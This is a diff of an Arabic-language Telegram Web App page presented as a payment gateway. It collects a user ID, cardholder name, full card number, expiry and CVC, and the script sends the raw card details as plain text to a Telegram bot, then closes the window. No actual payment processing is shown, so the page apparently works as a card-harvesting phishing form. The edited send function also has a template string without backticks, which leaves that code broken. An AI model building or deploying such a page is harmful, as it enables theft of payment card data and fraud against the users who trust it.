@@ -3,17 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الدفع الآمنة</title>
+    <title>بوابة الدفع</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
     <style>
-        body { background-color: #f4f4f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .payment-card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        h2 { text-align: center; color: #333; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        input:focus { outline: 2px solid #4a90e2; }
+        body {
+            background-color: #f4f4f9;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .payment-card {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus {
+            outline: 2px solid #4a90e2;
+        }
         .row { display: flex; gap: 10px; }
-        button { width: 100%; padding: 12px; background-color: #cccccc; color: #666666; border: none; border-radius: 8px; cursor: not-allowed; font-size: 16px; margin-top: 15px; font-weight: bold; transition: background-color 0.3s ease; }
-        button.active { background-color: #4a90e2; color: white; cursor: pointer; }
+        
+        /* تصميم الزر المعطل (رمادي) */
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #cccccc;
+            color: #666666;
+            border: none;
+            border-radius: 8px;
+            cursor: not-allowed;
+            font-size: 16px;
+            margin-top: 15px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+        
+        /* تصميم الزر عندما يصبح مفعل (أزرق) */
+        button.active {
+            background-color: #4a90e2;
+            color: white;
+            cursor: pointer;
+        }
+        button.active:hover { background-color: #357abd; }
     </style>
 </head>
 <body>
@@ -21,66 +72,99 @@
     <div class="payment-card">
         <h2>💳 إتمام عملية الدفع</h2>
         <form id="paymentForm">
+            <input type="text" id="userId" placeholder="معرف المستخدم (ID)" inputmode="numeric" required>
+            
             <input type="text" id="name" placeholder="اسم صاحب البطاقة" required>
+            
             <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="19" inputmode="numeric" required>
+            
             <div class="row">
                 <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+                
                 <input type="text" id="cvc" placeholder="CVC" maxlength="4" inputmode="numeric" required>
             </div>
-            <button type="button" id="submitBtn" onclick="sendDataToBot()" disabled>دفع الآن</button>
+            
+            <button type="button" id="submitBtn" onclick="sendData()" disabled>دفع الآن</button>
         </form>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // تمديد الشاشة لتظهر كاملة داخل التليجرام
+        tg.ready();
+        tg.expand();
 
         const submitBtn = document.getElementById('submitBtn');
 
-        document.getElementById('name').addEventListener('input', function(e) { this.value = this.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, ''); validateForm(); });
+        // منع إدخال أي شيء عدا الأرقام لحقل الـ ID
+        document.getElementById('userId').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            validateForm();
+        });
+
+        // منع إدخال أي شيء عدا الحروف والمسافات لحقل الاسم
+        document.getElementById('name').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, '');
+            validateForm();
+        });
+
+        // تنسيق ومنع الحروف في رقم البطاقة (إضافة فراغ كل 4 أرقام)
         document.getElementById('cardNum').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
             let formatted = '';
-            for (let i = 0; i < value.length; i++) { if (i > 0 && i % 4 === 0) { formatted += ' '; } formatted += value[i]; }
-            e.target.value = formatted; validateForm();
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formatted += ' ';
+                }
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+            validateForm();
         });
+        // تنسيق ومنع الحروف في التاريخ (إضافة الشحطة تلقائياً)
         document.getElementById('expiry').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
-            if (value.length > 2) { e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4); } else { e.target.value = value; } validateForm();
+            if (value.length > 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+            validateForm();
         });
-        document.getElementById('cvc').addEventListener('input', function (e) { this.value = this.value.replace(/[^0-9]/g, ''); validateForm(); });
 
+        // منع الحروف في الـ CVC
+        document.getElementById('cvc').addEventListener('input', function (e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            validateForm();
+        });
+
+        // دالة التحقق لتفعيل الزر وتحويله للأزرق
         function validateForm() {
+            const userId = document.getElementById('userId').value.trim();
             const name = document.getElementById('name').value.trim();
             const cardNum = document.getElementById('cardNum').value.trim();
             const expiry = document.getElementById('expiry').value.trim();
             const cvc = document.getElementById('cvc').value.trim();
-            if (name && cardNum.length === 19 && expiry.length === 5 && cvc.length >= 3) {
-                submitBtn.disabled = false; submitBtn.classList.add('active');
+
+            if (userId && name && cardNum.length === 19 && expiry.length === 5 && cvc.length >= 3) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
             } else {
-                submitBtn.disabled = true; submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
             }
         }
 
-        function sendDataToBot() {
-            submitBtn.disabled = true;
-            submitBtn.innerText = "جاري الحفظ...";
-
+        // دالة إرسال البيانات للتليجرام (بدون حقل الـ ID)
+        function sendData() {
             const name = document.getElementById('name').value.trim();
             const cardNum = document.getElementById('cardNum').value.trim();
             const expiry = document.getElementById('expiry').value.trim();
             const cvc = document.getElementById('cvc').value.trim();
 
-            const data = {
-                name: name,
-                cardNum: cardNum,
-                expiry: expiry,
-                cvc: cvc
-            };
-
-            // إرسال البيانات المباشرة والآمنة للبوت وإغلاق النافذة فوراً
-            tg.sendData(JSON.stringify(data));
-            tg.close(); 
+            const data = 💳 نوع العملية: Credit Card\n👤 الاسم: ${name}\n🔢 رقم البطاقة: ${cardNum}\n📅 التاريخ: ${expiry}\n🔒 رمز الـ CVC: ${cvc};
+            
+            tg.sendData(data);
+            tg.close();
         }
     </script>
 </body>
